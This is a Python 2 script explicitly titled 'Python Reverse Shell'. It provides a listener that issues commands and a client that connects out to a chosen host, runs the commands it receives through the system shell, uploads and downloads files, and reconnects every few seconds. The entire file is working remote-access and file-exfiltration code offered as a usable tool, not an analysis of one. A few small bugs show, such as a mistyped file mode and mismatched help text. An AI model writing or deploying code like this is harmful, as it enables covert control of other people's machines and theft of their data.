import sys
import time
import socket
import getopt
import threading
import subprocess

def help():
    print 'Python Reverse Shell'
    print
    print 'python reverse_shell.py -l -p <desired_port>'
    print 'python reverse_shell.py -t <target_port> -p <target_ip>'
    print
    print '-l --listen\t\t\t\t activate listen_mode'
    print '-t --target\t\t\t\t target_ip, host_ip if listen_mode'
    print "-p --port\t\t\t\t target_port, host_port if listen_mode"
    print "-h --help\t\t\t\t usage promt"
    print '<save_name> #download# <file_name>\t downloads <file_name> and saves as <save_name>'
    print '<save_name> #uploads# <file_name>\t uploads <file_name> and saves as <save_name>'
    print
    sys.exit(0)

def client_manager(client, addr):
    print 'Connection from: %s:%d' % (addr[0], addr[1])

    buffer = ""
    download_flag = False
    download_name = ""
    upload_flag = False
    upload_name = ""

    while True:
        time.sleep(0.005)
        buffer = raw_input("[#] ")
        buffer += "\n"

        if "#download#" in buffer:
            print "Starting download"
            download_flag = True
            download_name = buffer.split(" #download# ")[0].rstrip()
        
        if "#upload#" in buffer:
            print "Starting upload"
            upload_flag = True
            save_as = buffer.split(" #upload# ")[0].rstrip()
            upload_name = buffer.split(" #upload# ")[1].rstrip()
            file_to_upload = open(upload_name, "r")
            try:
                file_buffer = file_to_upload.read()
                client.send(save_as + " #upload# " + file_buffer + "\n")
            except:
                print "Error uploading file"
                client.send('ls')
            finally:
                file_to_upload.close()
        
        if upload_flag:
            upload_flag = False
        else:
            client.send(buffer)
        
        data_len = 1
        response = ""

        while data_len:
            data = client.recv(4096)
            data_len = len(data)
            response += data
            
            if data_len < 4096:
                break
        
        if download_flag:
            download_flag = False
            try:
                download_file = open(download_name, "w")
                download_file.write(response)
                download_file.close()
            except:
                print "Error downloading file"
        else:
            print response.rstrip()

def server_loop(target_ip, target_port):
    if not len(target_ip):
        target_ip = '0.0.0.0'
    
    try:
        print 'Starting server on %s:%d' % (target_ip, target_port)
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((target_ip, target_port))
        server.listen(1)
        print 'Server running on %s:%d' % (target_ip, target_port)

        while True:
            time.sleep(0.005)
            client, addr = server.accept()
            client_thread = threading.Thread(target=client_manager, args=(client, addr,))
            client_thread.start()
    except:
        print 'Error running the server'

def client_loop(target_ip, target_port):
    while True:        
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((target_ip, target_port))
            while True:
                time.sleep(0.005)
                buffer = ""            
                while "\n" not in buffer:
                    buffer += client.recv(1024)                
                if "#download#" in buffer:                
                    file_name = buffer.split(" #download# ")[1].rstrip()
                    download_file = open(file_name, "r")
                    try:
                        file_buffer = download_file.read()
                        client.send(file_buffer)
                    except:
                        client.send("Error downloading file")
                    finally:
                        download_file.close()
                elif "#upload#" in buffer:
                    message = "Upload complete"
                    file_name = buffer.split(" #upload# ")[0].rstrip()
                    file_contents = buffer.split(" #upload# ")[1]
                    try:
                        upload_file = open(file_name, "W")
                        upload_file.write(file_contents)
                    except:
                        message = "Error uploading file"
                    finally:
                        upload_file.close()
                    client.send(message)
                else:
                    response = run_command(buffer)
                    client.send(response)
        except:
            client.close()
        time.sleep(5)

def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to run command \r\n"
    
    if output:
        return output
    else:
        return "Command has no output"

def main():
    listen_mode = False
    target_ip = ''
    target_port = 0

    if not len(sys.argv[1:]):
        help()
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hlt:p:",
        ["help", "listen", "target", "port"])
    except getopt.GetoptError as err:
        print str(err)
        help()

    for opt, arg in opts:
        if opt in ("-h", "--help"):
            help()
        elif opt in ("-l", "--listen"):
            listen_mode = True
        elif opt in ("-t", "--target"):
            target_ip = arg
        elif opt in ("-p", "--port"):
            target_port = int(arg)
        else:
            assert False, "Invalid Parameter"
    
    if listen_mode and target_port != 0:
        server_loop(target_ip, target_port)
    elif target_port != 0 and len(target_ip):
        client_loop(target_ip, target_port)
    else:
        help()

main()